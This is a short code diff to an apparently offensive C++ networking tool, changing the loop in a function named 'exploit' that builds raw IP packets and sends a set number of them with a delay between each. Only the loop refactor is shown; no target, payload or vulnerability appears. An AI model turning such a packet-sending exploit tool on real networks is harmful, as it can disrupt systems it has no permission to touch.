@@ -82,7 +82,8 @@ void exploit(unsigned int time_to_sleep, int packet_to_send)
         }
         else
         {
-            for(int i = packet_to_send; i > 0 || i == -1; i--)
+            unsigned int packet_counter = 0;
+            while (packet_counter != packet_to_send)
             {
                 memset(packet, 0, PACKET_SIZE);
                 fill_ip_header(ip_header);
@@ -99,7 +100,10 @@ void exploit(unsigned int time_to_sleep, int packet_to_send)
                     exit(-3);
 		        }
 		        else
+                {
                     this_thread::sleep_for(chrono::milliseconds(time_to_sleep));
+                    packet_counter++;
+                }
             }
         }
     }
